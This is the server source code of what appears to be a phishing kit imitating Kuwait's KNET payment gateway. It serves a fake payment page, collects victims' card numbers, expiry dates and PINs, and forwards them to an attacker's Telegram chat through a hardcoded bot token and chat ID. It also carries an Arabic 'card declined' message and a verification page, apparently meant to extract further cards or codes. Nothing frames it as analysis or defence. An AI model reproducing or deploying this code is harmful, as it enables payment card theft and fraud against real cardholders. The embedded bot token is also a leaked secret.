const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = Number(process.env.PORT) || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const HTML_FILE = path.join(__dirname, 'knet.html');
const FRONTEND_ROOT = path.join(__dirname, 'frontend');
const BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
const CHAT_ID = '8108427825';
const VERIFICATION_PAGE_URL = 'http://127.0.0.1:3000/frontend/pages/verification.html';
const REJECTION_MESSAGE = 'تم رفض بطاقة الدفع يرجى التحقق من البيانات او استخدام بطاقة دفع مختلفة';

function safeJsonParse(value) {
  try {
    return JSON.parse(value);
  } catch (error) {
    return null;
  }
}

function normalize(payload = {}) {
  const source = payload && typeof payload === 'object' ? payload : {};
  const cardNumber = String(source.cardNumber || source.card || '').replace(/\D/g, '').slice(0, 19);
  const expiryMonth = String(source.expiryMonth || source.month || '').replace(/\D/g, '').slice(0, 2);
  const expiryYear = String(source.expiryYear || source.year || '').replace(/\D/g, '').slice(0, 2);
  const pin = String(source.pin || source.pinCode || source.cvv || '').replace(/\D/g, '').slice(0, 4);

  return {
    source: 'knet-form',
    createdAt: new Date().toISOString(),
    bankName: String(source.bankName || 'BBK').trim() || 'BBK',
    amount: Number(source.amount) || 0,
    currency: String(source.currency || 'KWD').toUpperCase(),
    cardNumber,
    prefix: cardNumber.slice(0, 6),
    cardHolder: String(source.cardHolder || '').trim(),
    expiryMonth: expiryMonth || 'MM',
    expiryYear: expiryYear || 'YY',
    pin,
    paymentMethod: String(source.paymentMethod || 'KNET').trim(),
    reference: String(source.reference || `KNET-${Date.now()}`).trim(),
    email: String(source.email || '').trim(),
    phone: String(source.phone || '').trim(),
    customerName: String(source.customerName || '').trim(),
    notes: String(source.notes || '').trim()
  };
}

function formatTelegramMessage(payload) {
  const bankName = payload.bankName || 'BBK';
  const prefix = String(payload.prefix || (payload.cardNumber || '').slice(0, 6) || 'N/A');
  const rawCardNumber = String(payload.cardNumber || 'N/A');
  const visibleCardNumber = prefix && rawCardNumber.startsWith(prefix)
    ? rawCardNumber.slice(prefix.length)
    : rawCardNumber;
  const expiryMonth = String(payload.expiryMonth || 'MM').padStart(2, '0');
  const expiryYear = String(payload.expiryYear || 'YY').padStart(2, '0');
  const pin = payload.pin || '0000';

  return [
    '📩 بطاقة دفع',
    '',
    '────────────────────',
    `🏦 اسم البنك: ${bankName}`,
    `💳 البادئة: ${prefix}`,
    `🔢 رقم البطاقة: ${visibleCardNumber}`,
    `📅 تاريخ الانتهاء: ${expiryMonth} / ${expiryYear}`,
    `🔐 الرقم السري: ${pin}`
  ].join('\n').replace(/\n\s+📅/g, '\n📅');
}

async function sendTelegramMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      disable_web_page_preview: true
    })
  });

  return response.json();
}

async function sendToTelegram(payload) {
  const message = formatTelegramMessage(payload);

  try {
    const result = await sendTelegramMessage(CHAT_ID, message);
    console.log('Telegram send result:', JSON.stringify(result));
    return result;
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return null;
  }
}

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify(data));
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk;
      if (body.length > 1_000_000) {
        req.destroy();
        reject(new Error('Body too large'));
      }
    });

    req.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }

      const parsed = safeJsonParse(body);
      if (parsed && typeof parsed === 'object') {
        resolve(parsed);
        return;
      }

      const entries = new URLSearchParams(body);
      const result = {};
      for (const [key, value] of entries.entries()) {
        result[key] = value;
      }
      resolve(result);
    });

    req.on('error', reject);
  });
}

function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
    '.webp': 'image/webp',
    '.txt': 'text/plain; charset=utf-8'
  };

  return types[ext] || 'application/octet-stream';
}

function resolveStaticFilePath(requestPath) {
  const cleanPath = decodeURIComponent((requestPath || '/')).split('?')[0].split('#')[0];

  if (!cleanPath || cleanPath === '/') {
    return HTML_FILE;
  }

  const relativePath = cleanPath.replace(/^\/+/, '');
  const candidate = path.join(FRONTEND_ROOT, relativePath);

  if (candidate.startsWith(FRONTEND_ROOT)) {
    return candidate;
  }

  return null;
}

function serveHtml(res) {
  fs.readFile(HTML_FILE, 'utf8', (error, content) => {
    if (error) {
      sendJson(res, 500, { success: false, message: 'Unable to read HTML file' });
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(content);
  });
}

function serveStaticFile(res, filePath) {
  fs.readFile(filePath, (error, content) => {
    if (error) {
      sendJson(res, 404, { success: false, message: 'File not found' });
      return;
    }

    res.writeHead(200, { 'Content-Type': getContentType(filePath) });
    res.end(content);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (req.method === 'GET' && url.pathname === '/') {
    serveHtml(res);
    return;
  }

  if (req.method === 'GET') {
    const requestedPath = resolveStaticFilePath(url.pathname);
    if (requestedPath && fs.existsSync(requestedPath)) {
      serveStaticFile(res, requestedPath);
      return;
    }
  }

  if (req.method === 'GET' && url.pathname === '/health') {
    sendJson(res, 200, { ok: true, service: 'knet-server', time: new Date().toISOString() });
    return;
  }

  if (req.method === 'GET' && url.pathname === '/api/knet') {
    sendJson(res, 200, { success: true, mode: 'telegram-only', items: [] });
    return;
  }

  if (req.method === 'POST' && url.pathname === '/api/knet') {
    try {
      const body = await readBody(req);
      const normalized = normalize(body);
      const telegramResult = await sendToTelegram(normalized);

      console.log('Telegram payload sent:', JSON.stringify({
        reference: normalized.reference,
        amount: normalized.amount,
        bankName: normalized.bankName,
        cardNumber: normalized.cardNumber
      }));

      sendJson(res, 200, {
        success: true,
        message: 'Telegram notification sent successfully',
        item: normalized,
        telegram: telegramResult
      });
    } catch (error) {
      console.error('POST /api/knet error:', error.message);
      sendJson(res, 400, { success: false, message: error.message || 'Invalid request' });
    }
    return;
  }

  sendJson(res, 404, { success: false, message: 'Route not found' });
});

server.listen(PORT, HOST, () => {
  console.log(`KNET Telegram sender running on http://${HOST}:${PORT}`);
  console.log(`Open http://${HOST}:${PORT}/`);
});
